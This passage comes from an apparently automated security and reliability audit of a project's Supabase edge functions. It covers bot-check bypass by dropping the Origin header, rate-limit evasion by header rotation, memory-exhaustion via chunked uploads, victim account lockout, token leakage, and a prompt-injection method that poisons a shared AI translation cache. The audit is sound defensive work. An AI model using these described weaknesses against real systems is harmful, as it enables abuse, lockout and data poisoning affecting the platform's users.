- **What breaks:** shouldEmit enforces a per-isolate per-minute cap (DEFAULT_CAP 30, scaled to floor(cap*0.1)=3/min under 'hard' pressure via pressureMul, lines 46-52,85) plus a 30s dedup window, returning false — dropping the event — when exceeded (lines 89,100). auditEdgeEvent honors it (line 115), so the `edge_function_error` telemetry these compliance functions rely on is throttled precisely when the system is busiest (spike/attack). The comment at line 113 claims a 'skip for known-low-volume security events' carve-out, but no such exemption exists — shouldEmit applies uniformly to every event type. For a tamper-evidence-oriented compliance surface, silently discarding audit rows during incidents is a real gap.
- **Smallest fix:** Actually implement the promised bypass so compliance/security event types skip the cap+dedup, or raise/remove the cap for that class; at minimum emit a 'dropped N events' marker so the gap is visible.

### [Medium] record-policy-acknowledgment has no rate limit and accepts a client-supplied anon_id — the §23/§19 acceptance trail can be forged and flooded  `security` (CONFIRMED)
- **Where:** supabase/functions/record-policy-acknowledgment/index.ts:32-60
- **What breaks:** Auth is optional (lines 46-50) and there is no rate limiting; `p_anon_id` is taken straight from client `body.anon_id` (line 59) and written into the acceptance record via the record_policy_ack RPC. Any anonymous caller can insert unlimited policy-acceptance rows and can fabricate acceptance under an arbitrary/guessable anon_id — the same class of forge/flood exposure flagged for record-consent, but on the legally-required T&C §23 / ToU §19 acceptance audit trail. Unlike record-consent this uses the anon key (RLS applies), so blast radius depends on the RLS policy on the target table, but the missing rate limit and client-bound anon_id are real.
- **Smallest fix:** Add per-IP rate limiting (enforceEdgeRateLimit already exists) and bind anon_id/user_id to the caller inside a SECURITY DEFINER RPC instead of trusting client-supplied anon_id; confirm RLS forbids arbitrary anon_id writes.
- _added-in-verification_

### [Low] dsar-submit has no rate limit or idempotency — duplicate DSAR rows each start a 30-day statutory clock  `boundary` (CONFIRMED)
- **Where:** supabase/functions/dsar-submit/index.ts:29-66
- **What breaks:** Verified: no enforceEdgeRateLimit call and no dedup/idempotency key anywhere in the handler. A double-click, a client retry, or a malicious authenticated user creates N dsar_requests rows, each returning `sla_days: 30` (line 66) and each starting its own SLA clock and admin task. The admin Privacy Requests view (the only notification path) fills with duplicates, raising the chance a real request is lost in the noise and inflating apparent SLA breaches.
- **Smallest fix:** Rate-limit per user and/or dedup open requests of the same type within a window (return the existing request id) inside submit_dsar.

### [Low] Sanctions deny-list and list version are hardcoded compile-time constants — updates need a code redeploy on a platform with a history of un-applied prod changes  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/_shared/compliance.ts:21-34
- **What breaks:** EMBARGOED_COUNTRIES and SANCTIONS_LIST_VERSION are source constants (lines 21-34). When OFAC/EU/UK add a jurisdiction, screening stays stale until an engineer edits code and redeploys the edge function. Given the documented history of prod migrations/crons silently not being applied on this platform (MEMORY.md), 'we updated the list' is a fragile assumption — the list can lag reality for weeks with no alarm, letting newly-sanctioned countries through while the audit row cites an outdated list_version.
- **Smallest fix:** Move the list + version to a DB table read at request time, or add a monitored freshness check that alerts when SANCTIONS_LIST_VERSION ages past a threshold.

### [Low] Public/service-role compliance endpoints use wildcard CORS with no origin restriction  `security` (CONFIRMED)
- **Where:** record-consent/index.ts:19-23; _shared/compliance.ts:2-6
- **What breaks:** `Access-Control-Allow-Origin: *` on record-consent (public + service-role write, lines 19-23) and on the shared helper used by policy-ack/sanctions/dispute (compliance.ts:2-6) means any origin can invoke these from a victim's browser. Combined with record-consent's lack of auth and rate limiting, any third-party site can drive consent-record inserts (and spam policy-ack/dispute/screening rows) using visitors' IPs — amplifying the forge/flood vectors above.
- **Smallest fix:** Restrict Allow-Origin to the known app origin(s) for state-changing endpoints, or add anti-automation (rate limit + Turnstile) since these are cross-origin reachable.

### [Low] record-consent runs an unindexed latest-row lookup on cookie_consents for every insert — the dedupe query is itself a cost amplifier on a rate-limitless, floodable table  `under-engineering` (PLAUSIBLE)
- **Where:** supabase/functions/record-consent/index.ts:70-96
- **What breaks:** The best-effort dedupe (lines 79-85) issues a per-request `select ... order by created_at desc limit 1` filtered on user_id or the client-supplied anon_id before every insert. Because the endpoint has no rate limit and anon_id is attacker-controlled and high-cardinality, an attacker who rotates anon_id forces a fresh ordered scan per request against a table they are simultaneously flooding — the mitigation added to protect Postgres becomes an added read amplification under the exact abuse it was meant to blunt, unless (user_id) and (anon_id, created_at) are indexed. At 767+ users plus bots this degrades the same admin Compliance queries.
- **Smallest fix:** Ensure covering indexes on cookie_consents(anon_id, created_at) and (user_id, created_at), and gate the endpoint with a rate limit so the dedupe lookup cannot be driven by unbounded distinct anon_ids.
- _added-in-verification_

---

## Edge: i18n, content, public & handoff endpoints

### [High] AI-translation spend cap is bypassable (anon-JWT/XFF rotation) + fail-open limiter → unbounded LOVABLE_API_KEY drain  `security` (CONFIRMED)
- **Where:** supabase/functions/_shared/translation-guard.ts:70-85 (rate key uses userId else leftmost x-forwarded-for; catch → fail-open); consumed by translate-strings/index.ts:53 (max 30/min) and translate-bundle/index.ts:31 (max 10/min)
- **What breaks:** guardTranslationRequest accepts ANY valid Supabase JWT (anon explicitly allowed) and keys the cap on `uid:<sub>` when signed-in else `ip:<leftmost XFF>`. The anonymous path keys on x-forwarded-for.split(',')[0] — the leftmost, attacker-controllable hop that client-ip.ts exists specifically to reject — so an attacker rotates that header to mint a fresh 30/min (strings) or 10/min (bundle) bucket per request; the signed-in path is likewise reset per fresh anonymous-sign-in sub. On top of that the limiter FAILS OPEN: any error from check_translation_rate_limit is swallowed (catch → rateAllowed stays true), so a DB hiccup removes the cap entirely. Every call fans out to the Lovable AI Gateway on the shared LOVABLE_API_KEY. Result: attacker-controlled, unbounded LLM spend billed to Tech Fleet — the exact abuse the H15 comment claims to have closed but did not.
- **Smallest fix:** Key the cap on the hardened clientIp() (cf-connecting-ip) AND per-uid, take the min, and bucket all anonymous JWTs into one shared low budget; fail CLOSED (or a tiny static cap) when the limiter errors instead of allowing the call.

### [High] get-community-events leaks organizer email addresses to the anonymous public (no DLP pass)  `security` (CONFIRMED)
- **Where:** supabase/functions/get-community-events/index.ts:51-61 (CachedEvent.organizerEmail) + :156 (`.map(e => ({ ...e, description }))` spreads organizerEmail through); populated at refresh-community-events/index.ts:579 (organizerEmail: ev.organizerEmail ?? "")
- **What breaks:** CachedEvent carries organizerEmail parsed from the ICS ORGANIZER mailto. The public unauthenticated GET spreads the whole event object (`...e`) so every response includes the organizer's raw email, and unlike public-project-detail this endpoint runs NO scrubJson/DLP pass. Any scraper harvests staff/organizer emails at scale; description text (cleaned only of a single Meet boilerplate line) can carry further PII. The '60 req/hr' cap that would slow this is itself bypassable (separate finding), so harvesting is effectively unthrottled.
- **Smallest fix:** Drop organizerEmail from the projection served to clients (omit it in the map, or don't persist it in refresh) and run the response body through scrubJson like the other public endpoints.

### [High] Transient Figma failure permanently blanks a submitted deliverable (empty sentinel never re-fetched)  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/handoff-produce/pipeline.ts:456-489 (ingestFigma: ANY catch leaves nodeText null → joined="" written to extracted_text for every entry) + :382-389 (loadRunContext only re-plans sources where extracted_text IS NULL)
- **What breaks:** ingestFigma catches every failure — transient ones included (429 after retries, 5xx, network/abort) — logs a warning, then writes a non-null empty string to extracted_text for ALL of that file's submissions (lines 473-482). Because loadRunContext only re-selects sources with extracted_text IS NULL, that board is NEVER fetched again on any future production of the phase. A brief Figma rate-limit or outage during the one production window silently and permanently drops a teammate's submitted deliverable from the hand-off; the writer-only retry reuses the same empty fact base. The code comment 'Do NOT re-fetch it next run' is correct only for the too-large design-file case and wrong for transient errors — it conflates the two. Only manual DB reset of extracted_text to NULL recovers it.
- **Smallest fix:** Distinguish permanent (FigmaResponseTooLarge / 4xx) from transient (429/5xx/abort) failures: write the empty sentinel only for permanent ones; on transient failure leave extracted_text NULL (or set a retry marker) so a later run re-attempts.

### [High] handoff-submit 50MB path is OOM-able by a chunked request with no Content-Length  `boundary` (CONFIRMED)
- **Where:** supabase/functions/handoff-submit/index.ts:45-46 (parseInt(content-length||'0')) + :82 (fileBytes = new Uint8Array(await f.arrayBuffer())); WAF size check _shared/waf.ts:127-132 (also content-length only; docstring: 'body is NOT consumed')
- **What breaks:** Both the WAF and the handler gate body size purely on the Content-Length header. A request with Transfer-Encoding: chunked (or with the header stripped) has no Content-Length, so parseInt returns 0 and both checks pass. The handler then calls req.formData() and buffers the whole file into memory via arrayBuffer() with no streaming byte cap. An attacker streams an arbitrarily large body (far beyond 72MB) into a ~256MB edge isolate and OOM-crashes it; repeated concurrently this is a cheap DoS against the intake function (the JWT check runs, but the body is buffered regardless once the header guards pass).
- **Smallest fix:** Enforce a hard byte cap while reading the stream (read req.body through a counting reader that aborts past MAX_BODY_BYTES) instead of trusting Content-Length; reject before buffering when declared or streamed size exceeds the cap.

### [Medium] translate-bundle never loads the real English source — permanently caches a 1-key bundle as the whole namespace  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/translate-bundle/index.ts:73-82 (enUrl = new URL(`/locales/en/${namespace}.json`, SUPABASE_URL); fetch 404s → source falls back to {app:{name:'Tech Fleet Network'}}) + :61-70 (cache read short-circuits on any cached rows)
- **What breaks:** The English source is fetched from the SUPABASE_URL host at /locales/..., but the comment on the next line admits the English bundle ships with the SPA, not Supabase. So sourceRes is not ok, Object.keys(source).length===0, and it falls back to the canned single-key object. The function then translates only {app:{name}} and upserts that as the cached bundle for that locale/namespace. On the next request the cache-hit branch (cached.length>0) returns the one-key bundle immediately and forever. So any locale that misses cache gets a permanently-cached near-empty namespace, and the AI-fallback path silently yields empty translations after the first call.
- **Smallest fix:** Accept the English source in the request body (the client already has it) or fetch it from the real SPA origin; refuse to cache when the source bundle is empty.

### [Medium] Machine translations bypass the i18n QA/approval gate and split into two inconsistent serving paths  `ownership` (CONFIRMED)
- **Where:** get-i18n-bundle/index.ts:60-66 (serves only status in ['qa_passed','approved']) vs translate-strings/index.ts:153-179 and translate-bundle/index.ts:114-137 (upsert rows with machine_translated:true and NO status) + translate-bundle cache read :61-65 (no status filter)
- **What breaks:** i18n_translations has a status/review model that get-i18n-bundle enforces, but translate-strings and translate-bundle write machine translations via service role with no status column set, and translate-bundle's own cache read applies no status filter. Two problems: (a) rows the QA workflow would gate as unreviewed are served raw by the translate-* path while get-i18n-bundle refuses them — two readers of the same table disagree on what is 'live', so the mechanisms drift; (b) any anon-authenticated caller inserts attacker-influenced rows (translate-strings namespace 'dom', up to 200/call) straight past moderation, and that LLM output is content-addressed and served back to other users with no review.
- **Smallest fix:** Give translate-* writes an explicit status (e.g. 'machine'/'pending') and make every reader filter on the same status set; route all i18n reads through one path so the review gate is single-owned.

### [Medium] handoff-submit uploads the blob BEFORE the DB insert — insert failure orphans the file with no cleanup  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/handoff-submit/index.ts:144-169 (svc.storage.upload(path,...) then insert into handoff_deliverable_submissions; on insErr returns 500 with no storage delete)
- **What breaks:** The object is written to the handoff-deliverables bucket first, then the row is inserted. If the insert fails (constraint / transient DB error) the function returns 500 but the uploaded file stays in storage with no submission row referencing it — an orphan nothing points at, never cleaned up, counting against bucket storage. The client will likely re-submit, re-uploading under a fresh crypto.randomUUID() name, so orphans accumulate unbounded across retries and there is no reconciliation job.
- **Smallest fix:** On insert failure delete the just-uploaded object (compensating action) before returning; or insert the row first and upload keyed on the row id.

### [Medium] Uploaded files are counted 'complete' but their bytes are never extracted — pipeline feeds only the filename string  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/handoff-produce/pipeline.ts:504-514 (file submissions → content `file: <file_name>`; only text_content/extracted_text/external_url used); extracted_text is set only by the Figma ingest path (:478), never for PDF/PNG/CSV/text uploads
- **What breaks:** For a 'file' submission with no extracted_text, the extractor's material becomes the literal string `file: report.pdf` — it does not match the ^https?:// filter, so it is kept and sent to the LLM as if it were content. The actual PDF/PNG/CSV bytes stored by handoff-submit are never parsed (the 'vision path later' is unimplemented). So a team that satisfies the completeness gate by uploading files gets hand-off components whose only material is a filename, yielding empty ('Awaiting content.') or hallucinated output, while handoff-produce reports the hand-off as ready. Silent content gap for a primary deliverable type.
- **Smallest fix:** Extract text from uploaded files (PDF/CSV/text at minimum) into extracted_text at ingest, or make the completeness gate not count un-extractable uploads as satisfying a content component so 'ready' matches what renders.

### [Medium] Public feeds run on the service role (RLS bypassed), guarded only by a hand-maintained column list + regex DLP that misses names/phones  `security` (CONFIRMED)
- **Where:** public-project-detail/index.ts:37,45,61 (getAdminClient; selects clients.primary_contact and coordinator names; scrubJson only redacts email/JWT/token/UUID/CC/IP) and public-project-openings/index.ts:28 (getAdminClient) vs _shared/dlp.ts:22-31 (no name/phone regex)
- **What breaks:** Both anonymous public endpoints query with the service role, so RLS provides zero protection — the ONLY controls are the explicit column list plus scrubJson's regex. clients.primary_contact is selected and returned, and coordinatorName (display/first/last name) is returned by design; dlp.ts has no name or phone pattern (CC_RE requires 13-19 digits, so a normal 10-digit phone is not caught, and EMAIL_RE won't match a bare name). So a person's name or phone stored in primary_contact/description/mission leaks to the anonymous internet, and any future column added to these selects leaks by default. A manual allow-list + lossy regex is the sole control on a service-role public endpoint — fragile by construction.
- **Smallest fix:** Serve these feeds through a restricted role / security-definer view exposing only intended columns (or the existing public RLS path like public-classes uses), and drop primary_contact from the public projection unless it is a vetted public contact.

### [Medium] geo-hint trusts spoofable client headers for country  `security` (CONFIRMED)
- **Where:** supabase/functions/geo-hint/index.ts:13-17 (country = cf-ipcountry || x-vercel-ip-country || x-country-code)
- **What breaks:** cf-ipcountry is edge-set, but x-vercel-ip-country and especially x-country-code are ordinary request headers a client sends with any value. Any consumer that uses geo-hint for geo-gating, region content, GDPR/consent region, or feature availability is trivially bypassed by sending `x-country-code: <whatever>`. The endpoint presents a spoofable value as the visitor's country with no indication it is untrusted.
- **Smallest fix:** Use only the platform-set header (cf-ipcountry behind Cloudflare); drop x-country-code / x-vercel-ip-country, or clearly mark the result as an untrusted hint and never let it drive an access/compliance decision.

### [Medium] refresh-community-events uses .update() on the singleton, not upsert — a missing row makes refresh a silent success no-op  `ownership` (CONFIRMED)
- **Where:** supabase/functions/refresh-community-events/index.ts:592-605 (.update({events,...}).eq('id',1); upsertError null when 0 rows match); docstring claims 'upserts'
- **What breaks:** The write is an UPDATE filtered to id=1. If that singleton row does not exist (fresh env, accidental delete, wrong id) the UPDATE matches 0 rows and returns NO error, so upsertError is null and the function returns status 'ok' with eventCount = deduped.length even though nothing was persisted. get-community-events then reads id=1 → null → serves an empty feed indefinitely while the 10-min cron reports success every time. Reported eventCount and actually-stored data silently diverge.
- **Smallest fix:** Use upsert on id=1 (or check the update's affected-row count and error/log when 0 rows matched) so a missing singleton is created rather than silently skipped.

### [Medium] get-community-events rate limit is isolate-local, keyed on spoofable leftmost XFF, and leaks memory  `security` (CONFIRMED)
- **Where:** supabase/functions/get-community-events/index.ts:67-80 (in-memory Map, RL_LIMIT=60/hr per isolate, never pruned) + :112 (ip = x-forwarded-for.split(',')[0]); contrast _shared/client-ip.ts
- **What breaks:** The '60 req/hour per IP' cap lives in a per-isolate in-memory Map, so real throughput is 60×(live isolates), and the key is the LEFTMOST X-Forwarded-For entry — the one client-ip.ts documents as attacker-controllable — so rotating the header yields a fresh bucket per request and nullifies the cap. The rl Map is also never pruned (entries only overwritten on the next hit for the same key), so distinct/spoofed IPs accumulate until the isolate recycles — a slow memory leak. This directly amplifies the organizer-email harvesting finding. (The WAF burst check runs on the hardened IP but only caps 100 req / 10s, not the harvesting-relevant hourly budget.)
- **Smallest fix:** Key on clientIp() (cf-connecting-ip) and enforce the cap in the shared DB-backed limiter (enforceEdgeRateLimit, as get-i18n-bundle does) instead of a per-isolate Map; prune expired entries if a local cache is kept.

### [Medium] translate-strings shared-batch prompt injection can poison the shared translation cache served to all users  `security` (PLAUSIBLE)
- **Where:** supabase/functions/translate-strings/index.ts:117-179 (whole strings[] array, up to 200 attacker items, sent in ONE LLM call; result cached content-addressed by sha256(locale::source) and upserted with machine_translated:true, no status)
- **What breaks:** All strings in one request share a single LLM call, and each output is cached keyed on the source string and served to any future user requesting that same source. An attacker (any anon JWT) batches a real UI string together with an injection string that instructs the model to emit a wrong/malicious translation for the target; the poisoned value is upserted to i18n_translations (namespace 'dom') and later returned to legitimate users who display that exact shared string. There is no status/review gate on this write or on translate-strings' own cache read, so the poisoned entry serves indefinitely until manually purged.
- **Smallest fix:** Translate each source string in its own isolated call (no shared batch context), constrain/validate model output, and mark machine rows with a status so they are not served as reviewed content.
- _added-in-verification_

### [Medium] translate-bundle accepts an arbitrary unvalidated namespace and writes it to i18n_translations under the service role  `security` (CONFIRMED)
- **Where:** supabase/functions/translate-bundle/index.ts:8-13 (BodySchema namespace: z.string().optional(), no charset/length limit) + :47,114-137 (namespace used verbatim in the upsert) vs get-i18n-bundle/index.ts:31-34 (namespace restricted to ^[a-z][a-z0-9_-]{0,32}$)
- **What breaks:** translate-bundle validates locale (SUPPORTED regex) but NOT namespace — it accepts any string and writes rows for it via service role. An attacker can (a) seed real namespaces like 'common' with garbage machine rows that this endpoint's own cache read (no status filter, :61-65) then returns on every subsequent call for that locale/namespace, degrading the AI-fallback for legitimate namespaces; and (b) create unbounded distinct namespaces of arbitrary length, bloating the shared table. get-i18n-bundle deliberately restricts namespace to a tight charset; translate-bundle does not, so the two writers/readers of the same table disagree on what a valid namespace even is.
- **Smallest fix:** Validate namespace with the same ^[a-z][a-z0-9_-]{0,32}$ regex get-i18n-bundle uses before any read or upsert, and reject anything else with 400.
- _added-in-verification_

### [Low] write-version.ts is dead production code duplicating the live inline arc-writer  `over-engineering` (CONFIRMED)
- **Where:** supabase/functions/handoff-produce/write-version.ts:33 (writeVersionPerArc) — grep confirms it is imported only by write-version.test.ts; production uses the inline path in pipeline.ts / pipeline-steps.ts
- **What breaks:** writeVersionPerArc implements arc-by-arc writing with foreign-slug filtering and failed-arc reporting, but nothing in production imports it (only its own test does). The step machine reimplements the same resilience logic inline, so two copies of non-trivial degradation handling drift independently: a fix to one silently doesn't apply to the other and a reader can't tell which is authoritative. Dead code that looks load-bearing.
- **Smallest fix:** Either delete write-version.ts and its test, or make pipeline-steps/pipeline consume writeVersionPerArc so there is one implementation.

### [Low] public-classes CORS allow-list is inert — any origin falls back to '*'  `other` (CONFIRMED)
- **Where:** supabase/functions/public-classes/index.ts:19-27 (corsFor: allow = ALLOWED_ORIGINS.has(origin) ? origin : '*')
- **What breaks:** Any origin NOT in ALLOWED_ORIGINS is answered with Access-Control-Allow-Origin '*', so every origin is allowed anyway and the maintained set is meaningless. It gives a false impression of an origin restriction that does not exist and will mislead the next engineer who tries to tighten it. (Data is public read-only via the anon key + RLS, so not an exposure itself, but the control is dead.)
- **Smallest fix:** If a real allow-list is intended, return no CORS origin (or 403) for non-listed origins; otherwise delete the set and document the feed as intentionally open.

### [Low] Four different supabase-js import specifiers/versions across these functions  `dependency` (CONFIRMED)
- **Where:** get-i18n-bundle/index.ts:5 (npm:@2, unpinned); translate-bundle/index.ts:4 & translate-strings/index.ts:9 (esm.sh@2.45.0); public-project-detail/index.ts:2 (npm:@2.49.1); translation-guard.ts:13 (npm:@2.99.1); get-community-events:12 (npm:@2.45.0)
- **What breaks:** The section pins the Supabase client many different ways (unpinned npm @2, esm.sh 2.45.0, 2.49.1, 2.99.1). auth.getClaims/getUser, storage signing, and PostgREST query building can differ across these, so a bug fixed or introduced in one function is inconsistent with its neighbors, and an unpinned `@2` can float to a new minor at deploy time and change auth/DLP behavior silently. Makes the security surface harder to audit.
- **Smallest fix:** Standardize on one pinned version via a shared import map / _shared module and use it everywhere in the section.

### [Low] public-project-detail uses .single() for the coordinator profile — a missing/duplicate row 500s the entire endpoint  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/public-project-detail/index.ts:109-119 (supabase.from('profiles')...eq('user_id', coordinator_id).single(); throws on 0 or >1 rows, caught by outer try → 500)
- **What breaks:** When project.coordinator_id is set but has no matching profile row (deleted user, un-provisioned profile) .single() returns an error; the surrounding try/catch turns it into a blanket 500. So a whole project becomes entirely unviewable on the anonymous public detail page instead of degrading coordinatorName to null. The intent (line 116) is clearly to treat a missing name as optional, but .single() makes it fatal.
- **Smallest fix:** Use .maybeSingle() and leave coordinatorName null when there is no row, matching the optional-name intent.
- _added-in-verification_

### [Low] translate-bundle has no single-flight — concurrent cache misses each fan out a full-namespace LLM translation on the shared key  `under-engineering` (PLAUSIBLE)
- **Where:** supabase/functions/translate-bundle/index.ts:60-137 (cache read → miss → LLM call → upsert, with no lock/dedup between concurrent requests for the same locale/namespace)
- **What breaks:** On a cold locale/namespace, N concurrent requests all miss the cache, all call the Lovable AI Gateway with the whole namespace, and all upsert. Combined with the fail-open + bypassable per-identity cap, a burst of first-hits multiplies LLM spend on the shared LOVABLE_API_KEY well beyond the nominal per-request budget, and the heaviest (full-namespace) call is exactly the one with no coalescing.
- **Smallest fix:** Add a short single-flight/lock (e.g. an advisory lock or a 'pending' cache marker) per locale/namespace so only one request performs the translation and the rest await or fall back.
- _added-in-verification_

---

## Edge: Security, rate-limit & ops

### [High] Turnstile human-verification fully bypassable by omitting the Origin header  `security` (CONFIRMED)
- **Where:** supabase/functions/verify-turnstile/index.ts:39-41,78-81 + _shared/auth-hosts.ts:11-23
- **What breaks:** isProd = isProductionOrigin(originHostFromRequest(req)); the host comes only from the client-controlled origin/referer header, and when absent auth-hosts.ts:13 returns "", so isProductionOrigin("")=false. In prod PROD_SECRET is set so secret=PROD_SECRET, a garbage token fails verifyWith(PROD_SECRET), then line 78 `(!ok||success!==true) && !isProd && secret!==TEST_SECRET` is TRUE and it retries with Cloudflare's always-pass TEST secret 1x0000...AA. A curl POST with a 20-char junk token and NO Origin header returns {success:true}, defeating bot protection on all four gated flows (login/register/forgot_password/signup_confirmation_resend) — enabling credential stuffing, mass fake signup, and password-reset/email-bomb abuse. verify-turnstile is critical:true.
- **Smallest fix:** Never let a client header decide the always-pass TEST secret. Gate the test-secret fallback on a server-side env flag (e.g. TURNSTILE_ALLOW_TEST==='true', unset in prod), or require a positive allow-listed production origin and reject when Origin is missing rather than treating missing as non-prod.

### [High] edge-deploy-smoke is structurally blind to un-deployed verify_jwt=false critical functions  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/edge-deploy-smoke/probe.ts:45; index.ts:76-88; _manifest.json (verify-turnstile/delete-account/admin-purge-auth-user/finalize-password-reset/login-with-captcha all verify_jwt:false, critical:true)
- **What breaks:** classifyProbe returns "missing" (the only verdict that pages, index.ts:76,87) ONLY for verify_jwt=true 404s (probe.ts:37). For verify_jwt=false functions a genuine 404 (function removed) is indistinguishable from deployed-without-OPTIONS, so probe.ts:45 returns "inconclusive" and NEVER pages. The manifest confirms the crown-jewel public functions are exactly verify_jwt:false + critical:true. If any of them silently un-deploys — the exact incident class this cron exists to catch — the pager stays silent. The Aug-2026 fix for 36k false positives traded them for false negatives on every public critical function.
- **Smallest fix:** For verify_jwt=false functions use a positive liveness probe that distinguishes deployed-without-OPTIONS from missing (a known safe route, or a mandatory health/OPTIONS responder so 404 unambiguously means missing). Do not leave critical public functions in a permanently unpageable bucket.

### [High] User JWT accepted (and logged) in the URL query string in save-form-draft  `security` (CONFIRMED)
- **Where:** supabase/functions/save-form-draft/index.ts:59-63
- **What breaks:** When no Authorization header is present the function reads the live access token from ?token= (line 62). The Supabase edge gateway, any intermediary proxy, and request/access logs capture full URLs including query strings, so live user bearer tokens land in logs and aggregation systems. A leaked bearer is full account takeover for its TTL. sendBeacon can carry the token in the JSON body instead, so the URL path is avoidable; at 767 users this fires on every pagehide/HMR reload.
- **Smallest fix:** Accept the token only from the Authorization header or the POST body, never the URL; if sendBeacon is required put the token in the JSON body and read it there. Strip all query-string token support.

### [High] Unauthenticated rate-limit endpoint enables targeted account-lockout DoS by victim email  `security` (CONFIRMED)
- **Where:** supabase/functions/rate-limit/index.ts:41-95 (verify_jwt:false, client-supplied identifier, action=login_attempt)
- **What breaks:** The endpoint is verify_jwt=false (manifest) and takes an arbitrary client-supplied identifier (email/username) + action, then increments the shared throttle bucket via check_rate_limit (max 6/15min, block 60min for login_attempt). An attacker POSTs a victim's email 6 times to trip the bucket, so the victim's own login pre-check (keyed on the same hashed identifier) returns allowed:false for an hour, repeatable indefinitely to lock any chosen user (or every user) out without touching their credentials. With no cap on the endpoint itself, the same loop is also a DB write-amplification DoS against the rate-limit table.
- **Smallest fix:** Increment the throttle only from the authoritative server-side auth path, not a directly callable public endpoint; or key the bucket on a server-derived identity (hashed cf-connecting-ip from client-ip.ts) instead of a fully client-supplied identifier, and add enforceEdgeRateLimit on this endpoint.

### [Medium] Rate limiter fails OPEN on RPC error — brute-force protection silently disabled  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/rate-limit/index.ts:97-107; _shared/edge-rate-limit.ts:29,32
- **What breaks:** On any check_rate_limit RPC error the handler returns {allowed:true} (line 104) and only logs. During a Postgres hiccup, pool exhaustion, or a hand-applied migration that renames/drops the RPC (memory: migrations are hand-applied with no prod CI — a missing RPC returns PGRST202), the login/signup/password-reset throttle is globally and silently off, opening a brute-force / credential-stuffing window exactly when the DB is already stressed. The shared edge-rate-limit helper fails open the same way (lines 29,32). Being 'documented' does not make an auth-flow fail-open safe.
- **Smallest fix:** For auth-security actions (login_attempt, password_reset, signup_attempt) fail CLOSED or degrade to a conservative last-known/in-memory cap on RPC error, and emit a pageable alert; reserve fail-open for non-security best-effort caps.

### [Medium] triage-error burns daily AI budget on transient failures with no refund  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/triage-error/index.ts:187-200 (claim) before 213-267 (AI call/parse that can 502)
- **What breaks:** claim_triage_budget increments the tenant-wide 20/day counter at line 187 BEFORE the Lovable AI fetch. Every downstream failure — network throw (230 -> 502), non-2xx gateway (235-240 -> 502), unparseable JSON (258 -> 502), invalid shape (266 -> 502) — returns without releasing the claimed slot. A flapping AI gateway drains the entire daily budget in 20 failed attempts, after which legitimate triage returns 429 (daily_cap_reached) for the rest of the day. The cost-control mechanism becomes a self-inflicted denial of the triage feature.
- **Smallest fix:** Claim the budget only after a successful, parsed AI response, or release/refund the claimed slot on every pre-persist failure path so transient errors don't permanently burn quota.

### [Medium] Orphan reaper reports ok:true while storage deletions are failing  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/reap-class-module-orphans/index.ts:53-71
- **What breaks:** Batch storage.remove errors are pushed into errors[] (line 56) but summary.ok is hardcoded true (line 62) and that same object is emitted as the golden-signal structured log (line 70). If the Storage API persistently rejects deletes (auth drift, bucket rename, throttling), orphan blobs accumulate indefinitely in the private class-module-files bucket (storage cost + retention/compliance exposure for deleted-class material) while every monitoring signal says ok:true. removed += batch.length only on the success branch, so on a partial-failure batch the count drifts from reality. No lock/idempotency guard means an overlapping cron double-fire re-issues removes on already-deleted keys, generating spurious errors[].
- **Smallest fix:** Set ok = errors.length === 0 and surface a non-200 or a severity:error audit event when deletes fail so the reaper's own failures are pageable; add an advisory lock or dedupe to prevent overlapping runs.

### [Medium] Rate-limit identity hash is peppered with the service-role key  `ownership` (CONFIRMED)
- **Where:** supabase/functions/rate-limit/index.ts:78-82
- **What breaks:** The throttle bucket key is SHA-256(identifier + SUPABASE_SERVICE_ROLE_KEY). (1) Key hygiene: the platform's most powerful secret (full DB god-mode) is repurposed as a hash pepper mixed with attacker-influenced input, giving it two unrelated responsibilities. (2) Operational: rotating the service-role key — a standard incident-response action — instantly changes every hashed identifier, so all active rate-limit blocks evaporate and every in-progress attacker gets fresh full buckets at the exact moment you are rotating keys because of a suspected compromise.
- **Smallest fix:** Use a dedicated, purpose-scoped RATE_LIMIT_PEPPER (or HMAC key) independent of the service-role key so rotating one doesn't reset the other and the god-key isn't fed attacker input.

### [Medium] save-form-draft and client-rate-limit-log buffer request bodies unbounded  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/save-form-draft/index.ts:71-72; supabase/functions/client-rate-limit-log/index.ts:55-63
- **What breaks:** Sibling functions use readBoundedText/parseJsonBody (_shared/http.ts:50) to cap the body WHILE streaming and explicitly not trust Content-Length. save-form-draft instead calls req.text() (line 71), reading the ENTIRE body into memory before checking raw.length. client-rate-limit-log computes contentLength from the header and, when the header is absent, `Number(null ?? "0")`=0 passes the guard (line 56) and it then calls req.json() unbounded (line 63). A client that omits Content-Length and streams a multi-hundred-MB body forces the full buffer into edge memory before any limit applies — a memory-pressure DoS on functions that had the hardened helper available and didn't use it. Also save-form-draft's raw.length is UTF-16 code-unit count compared against a value labeled '256 KB bytes', so the cap is wrong for multibyte payloads.
- **Smallest fix:** Use readBoundedText(req, cap) (as the other edge functions do) in both handlers so the limit is enforced during streaming and independent of Content-Length; measure bytes, not string length.

### [Medium] edge-deploy-smoke classifies any non-404 as alive — a crash-looping deployed function never pages  `error-handling` (PLAUSIBLE)
- **Where:** supabase/functions/edge-deploy-smoke/probe.ts:36-46
- **What breaks:** added-in-verification. For verify_jwt=true, probe.ts returns "alive" for 401/403 AND for the catch-all `return "alive"` at line 38, so a deployed function that 500s on every request (missing env var, bad import, startup throw) reads as healthy. For verify_jwt=false, any non-404 (line 46) is "alive" too. The smoke test therefore only ever detects 'binary missing' and is completely blind to 'deployed but broken on every call' — the more common production failure. A crash-looping critical function pages nothing while the dashboard shows all green.
- **Smallest fix:** Treat repeated 5xx from a probe as a separate degraded/error verdict that pages (or at least reports), rather than folding every non-404 into 'alive'; for verify_jwt=true distinguish the gateway 401/403 liveness signal from a 5xx coming out of the function itself.

### [Low] Internal DB/exception messages leaked to clients in save-form-draft  `security` (CONFIRMED)
- **Where:** supabase/functions/save-form-draft/index.ts:119-123,128-132
